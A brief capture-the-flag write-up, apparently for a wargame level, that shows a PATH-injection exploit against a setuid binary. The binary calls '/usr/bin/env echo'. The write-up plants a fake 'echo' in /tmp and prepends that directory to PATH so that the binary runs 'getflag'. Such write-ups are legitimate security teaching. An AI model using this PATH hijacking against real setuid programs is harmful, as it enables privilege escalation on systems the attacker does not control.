▐▓▌   ▐▓▓▓▓▌▐▓▌▐▓▌▐▓▓▓▓▌▐▓▌   ▐▓▓▓▓▌▐▓▓▓▓▌
▐▓▌   ▐▓▌   ▐▓▌▐▓▌▐▓▌   ▐▓▌   ▐▓▌▐▓▌   ▐▓▌
▐▓▌   ▐▓▓▓▌ ▐▓▌▐▓▌▐▓▓▓▌ ▐▓▌   ▐▓▌▐▓▌▐▓▓▓▓▌
▐▓▌   ▐▓▌   ▐▓▌▐▓▌▐▓▌   ▐▓▌   ▐▓▌▐▓▌   ▐▓▌
▐▓▓▓▓▌▐▓▓▓▓▌ ▐▓▓▌ ▐▓▓▓▓▌▐▓▓▓▓▌▐▓▓▓▓▌▐▓▓▓▓▌

exploit: path injection

=======
We have the following:
file level03 
level03: setuid setgid ELF 32-bit LSB executable.....

strings ./level03
/usr/bin/env echo Exploit me

ltrace ./level03
system("/usr/bin/env echo Exploit me"Exploit me

We can change the /usr/bin/env echo to execute our own echo that will call getflag.

First let's create our fake bin:
mkdir /tmp/fakebin 
echo "getflag" > /tmp/fakebin/echo
chmod +x /tmp/fakebin/echo

and now let's change our $PATH env:
export PATH=/tmp/fakebin:$PATH

Now executing the program executes getflag!
